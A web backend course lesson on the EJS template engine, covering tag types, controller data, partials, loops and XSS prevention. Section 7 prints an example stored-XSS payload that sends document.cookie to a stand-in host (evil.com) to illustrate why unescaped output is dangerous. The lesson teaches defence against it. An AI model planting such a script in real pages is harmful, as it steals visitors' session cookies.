# Learning Activity 06 — EJS Template Engine

> **Course:** BYU-I CSE 340 Web Backend Development — Week 1  
> **Outcome:** Write EJS templates using all tag types, pass data from controllers, include partials, loop over arrays, and understand EJS's XSS protections.

---

## What Is EJS?

EJS (Embedded JavaScript) is a templating language that generates HTML using JavaScript logic embedded directly in the markup. It solves a fundamental problem: you need HTML that changes based on data (different organizations, different page titles, different error messages).

```
Controller         →       EJS Template        →      HTML Sent to Browser
─────────────────────────────────────────────────────────────────────────
{ title: 'Home',   →  <title><%= title %></title>  →  <title>Home | Tech Charities</title>
  orgs: [...] }       <% orgs.forEach(o => { %>       <ul>
                         <li><%= o.name %></li>          <li>Code for Change</li>
                       <% }) %>                          <li>Digital Equity Now</li>
                                                      </ul>
```

---

## 1. EJS Tag Types

Four tag types — memorize them:

```ejs
<% code %>       ← Scriptlet: runs JS, outputs nothing
<%= value %>     ← Escaped output: HTML-encodes the value (XSS-safe)
<%- value %>     ← Unescaped output: inserts raw HTML (use sparingly!)
<%# comment %>   ← Comment: stripped at render time, not in HTML source
```

### Escaped vs. Unescaped Output

```ejs
<%
  const userInput = '<script>alert("hacked")</script>'
  const safeHtml  = '<strong>Bold text</strong>'
%>

<%= userInput %>
<!-- Renders: &lt;script&gt;alert(&quot;hacked&quot;)&lt;/script&gt;
     Browser shows as text — NOT executed. This is XSS protection. -->

<%- safeHtml %>
<!-- Renders: <strong>Bold text</strong>
     Browser renders bold. ONLY use <%- %> for HTML you generated yourself. -->

<!-- NEVER do this — XSS vulnerability -->
<%- req.query.search %>
```

**Rule:** Use `<%= %>` for all user-facing data. Only use `<%- %>` for:
- `<%- include('./partials/header') %>` (including partial files)
- HTML strings you constructed entirely on the server

---

## 2. Passing Data from Controller to View

`res.render()` takes a view name and a plain object. Every key becomes a local variable in the template.

```js
// Controller
res.render('categories', {
  title: 'Categories',              // → available as: title
  categories: [...],                // → available as: categories
  currentUser: req.session?.user    // → available as: currentUser
})
```

```ejs
<!-- views/categories.ejs -->
<title><%= title %> | Tech Charities</title>

<h1><%= title %></h1>

<% if (currentUser) { %>
  <p>Welcome back, <%= currentUser.name %>!</p>
<% } %>
```

---

## 3. Partials — Reusable Fragments

Partials let you write the `<head>`, header, and footer once and include them on every page.

```js
// Including a partial — passes local variables into the partial
<%- include('./partials/header', { title: title }) %>
// Note: <%- (unescaped) is correct here because include() returns HTML
```

```ejs
<!-- views/partials/header.ejs -->
<!DOCTYPE html>
<html lang="en">
<head>
  <title><%= title %> | Tech Charities</title>  ← title comes from the include call
  <link rel="stylesheet" href="/css/styles.css">
</head>
<body>
  <header>...</header>
  <main>
  <!-- page content begins here, footer closes it -->
```

```ejs
<!-- views/partials/footer.ejs -->
  </main>
  <footer>...</footer>
  <script>/* ... */</script>
</body>
</html>
```

```ejs
<!-- views/categories.ejs — a complete page using partials -->
<%- include('./partials/header', { title: title }) %>

<h1><%= title %></h1>
<!-- page content -->

<%- include('./partials/footer') %>
```

---

## 4. EJS in Practice — All Patterns

### Conditionals

```ejs
<% if (categories.length === 0) { %>
  <p>No categories found.</p>
<% } else { %>
  <p><%= categories.length %> categories available.</p>
<% } %>

<!-- Ternary in output -->
<span class="status <%= org.active ? 'active' : 'inactive' %>">
  <%= org.active ? 'Active' : 'Inactive' %>
</span>
```

### Loops

```ejs
<!-- forEach — most readable -->
<ul>
  <% categories.forEach(cat => { %>
    <li class="<%= cat.cssClass %>">
      <strong><%= cat.name %></strong>
      <p><%= cat.description %></p>
    </li>
  <% }) %>
</ul>

<!-- With index -->
<% organizations.forEach((org, index) => { %>
  <article id="org-<%= org.id %>" class="<%= index === 0 ? 'featured' : '' %>">
    <h2><%= org.name %></h2>
  </article>
<% }) %>
```

### Inline Expressions

```ejs
<p>Showing <%= organizations.length %> of <%= total %> organizations</p>
<p>Last updated: <%= new Date().toLocaleDateString('en-US') %></p>
<img src="<%= org.image %>" alt="<%= org.alt %>">
<a href="/organizations/<%= org.id %>"><%= org.name %></a>
```

---

## 5. Before/After Rendering

Seeing the transformation from `.ejs` to `.html` helps you understand what EJS actually does.

**`views/categories.ejs` (template):**
```ejs
<%- include('./partials/header', { title: title }) %>
<ul>
  <% categories.forEach(cat => { %>
    <li><strong><%= cat.name %></strong>: <%= cat.description %></li>
  <% }) %>
</ul>
<%- include('./partials/footer') %>
```

**Data passed by controller:**
```js
{
  title: 'Categories',
  categories: [
    { name: 'Environmental', description: 'Tech for the environment.' },
    { name: 'Educational',   description: 'Tech for learning.' }
  ]
}
```

**HTML sent to browser (after rendering):**
```html
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Categories | Tech Charities</title>
  <link rel="stylesheet" href="/css/styles.css">
</head>
<body>
  <header>...</header>
  <main>
    <ul>
      <li><strong>Environmental</strong>: Tech for the environment.</li>
      <li><strong>Educational</strong>: Tech for learning.</li>
    </ul>
  </main>
  <footer>...</footer>
</body>
</html>
```

All EJS tags are gone. The browser receives pure HTML — it never knows EJS was involved.

---

## 6. Layouts Without a Framework

EJS doesn't have a built-in layout system, but the partial pattern achieves the same result:

```
Every page file (home.ejs, categories.ejs, etc.) is the "content slot".
header.ejs provides the top of the HTML document.
footer.ejs closes it.

home.ejs
  ├── include header.ejs → <!DOCTYPE html>...<main>
  ├── <section class="hero">...</section>
  └── include footer.ejs → </main>...</html>
```

This approach is simple, explicit, and requires no additional packages.

---

## 7. EJS Security — XSS Prevention

Cross-Site Scripting (XSS) is one of the most common web vulnerabilities. An attacker injects malicious JavaScript into your page that runs in other users' browsers.

```
Attack scenario:
  1. User submits org name: <script>document.location='https://evil.com?c='+document.cookie</script>
  2. You store it in your database unmodified.
  3. You render it with <%- org.name %> (unescaped).
  4. Every visitor's cookies are now stolen.
```

```ejs
<!-- DANGEROUS — never use <%- %> for user-submitted data -->
<%- org.name %>

<!-- SAFE — <%= %> HTML-encodes < > " & ' so scripts are inert -->
<%= org.name %>
<!-- <script>... renders as &lt;script&gt;... — harmless text -->
```

The **only** legitimate uses of `<%- %>` in this course:
1. `<%- include('./partials/header', ...) %>` — including partials
2. Pre-sanitized HTML from a trusted library (not user input)

---

## Practice Exercises

1. Add a `count` variable to your categories controller and display it in the template: "Showing 4 categories."
2. Display organizations in two columns: if `index % 2 === 0` add a CSS class `col-left`, else `col-right`.
3. Open a rendered page in Chrome DevTools → View Source. Verify that no EJS tags appear in the HTML. Find the equivalent of the `<%= title %>` output.

---

## Common EJS Errors and Fixes

| Error | Cause | Fix |
|-------|-------|-----|
| `categories is not defined` | Controller didn't pass the variable | Add `categories` to `res.render()` data object |
| `Cannot read property 'name' of undefined` | Array item is `undefined` | Check your data source; add null guard: `<% if (org) { %>` |
| `ReferenceError: include is not defined` | Wrong syntax | Use `<%- include('./partials/header') %>` not `include()` alone |
| Raw `<script>` tag visible in page | Using `<%- %>` for user data | Switch to `<%= %>` |
| Template renders but layout is broken | Mismatched opens/closes in partial | Check that `header.ejs` opens `<main>` and `footer.ejs` closes it |

---

*Next: [07 — Deployment Pipeline](./07-deployment-pipeline.md)*
